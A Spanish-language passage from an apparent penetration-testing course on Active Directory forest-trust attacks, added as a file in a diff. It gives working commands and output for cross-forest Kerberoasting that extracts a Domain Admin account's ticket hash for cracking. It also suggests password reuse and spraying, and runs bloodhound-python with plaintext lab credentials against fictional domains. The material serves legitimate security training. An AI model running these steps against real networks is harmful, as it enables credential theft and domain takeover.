@@ -1,0 +1,146 @@
+Como vimos en la sección anterior, a menudo es posible realizar Kerberoasting a través de un forest trust. Si esto es posible en el entorno que estamos evaluando, podemos realizar esto con `GetUserSPNs.py` desde nuestro Linux attack host. Para hacerlo, necesitamos credenciales para un usuario que pueda autenticarse en el otro domain y especificar el flag `-target-domain` en nuestro comando. Al realizar esto contra el domain `FREIGHTLOGISTICS.LOCAL`, vemos una entrada SPN para la cuenta `mssqlsvc`.
+
+## Cross-Forest Kerberoasting
+
+### Using GetUserSPNs.py
+
+```r
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
+```
+
+Ejecutando nuevamente el comando con el flag `-request` agregado, obtenemos el TGS ticket. También podríamos agregar `-outputfile <OUTPUT FILE>` para guardar directamente en un archivo que luego podríamos usar con Hashcat.
+
+### Using the -request Flag
+
+```r
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
+
+
+$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
+```
+
+Luego podríamos intentar crackear esto offline usando Hashcat con el modo `13100`. Si tiene éxito, podríamos autenticarnos en el domain `FREIGHTLOGISTICS.LOCAL` como un Domain Admin. Si tenemos éxito con este tipo de ataque durante una evaluación en el mundo real, también valdría la pena verificar si esta cuenta existe en nuestro domain actual y si sufre de reutilización de contraseñas. Esto podría ser una victoria rápida para nosotros si aún no hemos podido escalar en nuestro domain actual. Incluso si ya tenemos control sobre el domain actual, valdría la pena agregar un hallazgo a nuestro informe si encontramos reutilización de contraseñas en cuentas con nombres similares en diferentes domains.
+
+Supongamos que podemos realizar Kerberoasting a través de un trust y hemos agotado las opciones en el domain actual. En ese caso, también podría valer la pena intentar un solo password spray con la contraseña crackeada, ya que existe la posibilidad de que se pueda usar para otras cuentas de servicio si los mismos administradores están a cargo de ambos domains. Aquí, tenemos otro ejemplo de pruebas iterativas y de no dejar ninguna piedra sin mover.
+
+---
+
+## Hunting Foreign Group Membership with Bloodhound-python
+
+Como se mencionó en la última sección, de vez en cuando podemos ver usuarios o administradores de un domain como miembros de un grupo en otro domain. Dado que solo `Domain Local Groups` permiten usuarios de fuera de su forest, no es raro ver a un usuario altamente privilegiado de Domain A como miembro del grupo built-in administrators en Domain B cuando se trata de una relación bidirectional forest trust. Si estamos probando desde un host Linux, podemos recopilar esta información usando la [Python implementation of BloodHound](https://github.com/fox-it/BloodHound.py). Podemos usar esta herramienta para recopilar datos de múltiples domains, ingerirlos en la herramienta GUI y buscar estas relaciones.
+
+En algunas evaluaciones, nuestro cliente puede aprovisionar una VM para nosotros que obtiene una IP de DHCP y está configurada para usar el DNS del domain interno. En otros casos, estaremos en un attack host sin DNS configurado. En este caso, necesitaríamos editar nuestro archivo `resolv.conf` para ejecutar esta herramienta ya que requiere un DNS hostname para el Domain Controller objetivo en lugar de una dirección IP. Podemos editar el archivo de la siguiente manera usando derechos de sudo. Aquí hemos comentado las entradas del servidor de nombres actuales y agregado el nombre del domain y la dirección IP de `ACADEMY-EA-DC01` como el servidor de nombres.
+
+### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+
+```r
+cat /etc/resolv.conf 
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+Una vez que esto está en su lugar, podemos ejecutar la herramienta contra el domain objetivo de la siguiente manera:
+
+### Running bloodhound-python Against INLANEFREIGHT.LOCAL
+
+```r
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 559 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 2950 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+
+<SNIP>
+```
+
+Podemos comprimir los archivos zip resultantes para cargar un solo archivo zip directamente en la GUI de BloodHound.
+
+### Compressing the File with zip -r
+
+```r
+zip -r ilfreight_bh.zip *.json
+
+  adding: 20220329140127_computers.json (deflated 99%)
+  adding: 20220329140127_domains.json (deflated 82%)
+  adding: 20220329140127_groups.json (deflated 97%)
+  adding: 20220329140127_users.json (deflated 98%)
+```
+
+Repetiremos el mismo proceso, esta vez completando los detalles para el domain `FREIGHTLOGISTICS.LOCAL`.
+
+### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
+
+```r
+cat /etc/resolv.conf 
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+```
+
+El comando `bloodhound-python` se verá similar al anterior:
+
+### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
+
+```r
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+
+INFO: Found AD domain: freightlogistics.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 5 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 9 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 52 groups
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+```
+
+Después de cargar el segundo conjunto de datos (ya sea cada archivo JSON o como un solo archivo zip), podemos hacer clic en `Users with Foreign Domain Group Membership` bajo la pestaña `Analysis` y seleccionar el domain de origen como `INLANEFREIGHT.LOCAL`. Aquí, veremos que la cuenta de Administrator incorporada para el domain INLANEFREIGHT.LOCAL es miembro del grupo Administrators incorporado en el domain FREIGHTLOGISTICS.LOCAL como vimos anteriormente.
+
+### Viewing Dangerous Rights through BloodHound
+
+![image](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)
+
+---
+
+## Closing Thoughts on Trusts
+
+Como se ha visto en las últimas secciones, hay varias maneras de aprovechar domain trusts para obtener acceso adicional e incluso hacer un "end-around" y escalar privilegios en nuestro domain actual. Por ejemplo, podemos tomar el control de un domain con el que nuestro domain actual tiene un trust y encontrar reutilización de contraseñas en cuentas privilegiadas. Hemos visto cómo los derechos de Domain Admin en un child domain casi siempre significan que podemos escalar privilegios y comprometer el parent domain usando el ataque ExtraSids. Los domain trusts son un tema bastante grande y complejo. El resumen en este módulo nos ha dado las herramientas para enumerar trusts y realizar algunos ataques intra-forest y cross-forest estándar.
